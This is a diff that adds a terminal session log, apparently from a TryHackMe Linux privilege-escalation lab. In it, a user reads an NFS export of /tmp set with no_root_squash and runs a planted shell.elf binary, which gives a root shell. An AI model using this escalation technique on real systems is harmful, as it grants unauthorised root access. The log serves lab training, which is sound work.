@@ -1,0 +1,46 @@
+Script started on 2025-03-22 19:41:03+03:00 [COMMAND="ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa user@linux.privesc.thm" TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="104" LINES="27"]
+user@linux.privesc.thm's password: 
+Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sat Mar 22 12:33:38 2025 from ip-10-8-61-245.eu-west-1.compute.internal
+]0;user@debian: ~user@debian:~$ cat /etc/exports
+# /etc/exports: the access control list for filesystems which may be exported
+#		to NFS clients.  See exports(5).
+#
+# Example for NFSv2 and NFSv3:
+# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
+#
+# Example for NFSv4:
+# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
+# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
+#
+
+/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
+
+#/tmp *(rw,sync,insecure,no_subtree_check)
+
+]0;user@debian: ~user@debian:~$ cd /tmp
+]0;user@debian: /tmpuser@debian:/tmp$ ls
+[0m[01;31mbackup.tar.gz[0m  shell.elf  useless
+]0;user@debian: /tmpuser@debian:/tmp$ /tmp/shell.elf
+user@debian:/tmp$ exit
+exit
+]0;user@debian: /tmpuser@debian:/tmp$ /tmp/shell.elfls[K/tmp/shell.elf
+user@debian:/tmp$ exit
+exit
+]0;user@debian: /tmpuser@debian:/tmp$ /tmp/shell.elf
+bash-4.1# id
+uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
+bash-4.1# exit
+exit
+]0;user@debian: /tmpuser@debian:/tmp$ exit
+logout
+Connection to linux.privesc.thm closed.
+
+Script done on 2025-03-22 19:46:22+03:00 [COMMAND_EXIT_CODE="0"]
